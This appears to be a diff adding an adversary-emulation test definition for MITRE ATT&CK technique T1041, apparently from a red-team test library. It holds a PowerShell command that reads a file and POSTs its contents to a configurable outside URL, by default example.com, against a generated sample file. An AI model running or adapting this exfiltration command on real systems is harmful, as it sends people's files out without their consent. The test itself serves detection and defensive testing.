@@ -1,0 +1,34 @@
+attack_technique: T1041
+display_name: 'Exfiltration Over C2 Channel'
+atomic_tests:
+- name: C2 Data Exfiltration
+  description: |
+    Exfiltrates a file present on the victim machine to the C2 server.
+  supported_platforms:
+  - windows
+  input_arguments:
+    destination_url:
+      description: Destination URL to post encoded data.
+      type: string
+      default: example.com
+    filepath:
+      description: The file which is being exfiltrated to the C2 Server.
+      type: string
+      default: C:\Users\$env:UserName\LineNumbers.txt
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The file to be exfiltrated must be present on the machine. Running the pre-reqs will create a sample file to be exfiltrated, else give the path of already present file as input.
+    prereq_command: |
+      if ([System.IO.File]::Exists("C:\Users\$env:UserName\LineNumbers.txt")){exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "Creating file to be exfiltrated" 
+      1..100 | ForEach-Object { Add-Content -Path C:\Users\$env:UserName\LineNumbers.txt -Value "This is line $_." }
+  executor:
+    command: |
+      [System.Net.ServicePointManager]::Expect100Continue = $false
+      $filecontent = Get-Content -Path #{filepath}
+      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+    name: powershell
+
